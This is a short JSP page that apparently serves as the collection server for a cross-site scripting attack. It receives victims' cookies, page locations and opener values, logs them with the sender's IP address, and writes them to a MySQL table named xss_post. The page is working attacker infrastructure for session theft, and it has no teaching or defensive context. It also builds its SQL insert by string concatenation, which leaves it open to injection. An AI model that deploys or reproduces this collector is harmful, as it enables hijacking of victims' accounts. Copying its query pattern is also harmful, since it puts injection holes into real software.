<%@ page language="java" import="java.util.*"pageEncoding="UTF-8"%>
<%@ page import="java.sql.*"%>
<%@ page import="com.mysql.jdbc.Driver"%>

<%
String location = request.getParameter("location");

String toplocation = request.getParameter("toplocation");

String cookie = request.getParameter("cookie");

String opener = request.getParameter("opener");

String ip = request.getRemoteAddr();


String path = request.getContextPath();

String basePath = request.getScheme() + "://" +request.getServerName() + ":" +request.getServerPort() + path +"/";  

String driverName = "com.mysql.jdbc.Driver";

String DBUser = "xsser";

String DBPasswd = "xxxxxxxx";

String DBName = "xsss";

String connUrl = "jdbc:mysql://localhost/" + DBName +"?user=" + DBUser +"&password=" + DBPasswd;

Class.forName(driverName).newInstance();

Connection conn = DriverManager.getConnection(connUrl);

Statement stmt = conn.createStatement();

String sql = "insert into xss_post (location,toplocation,cookie,opener,ip) values ('"+location+"','"+toplocation+"','"+cookie+"','"+opener+"','"+ip+"')";

stmt.executeUpdate(sql);

%>

<% 
stmt.close();
conn.close();	
%>
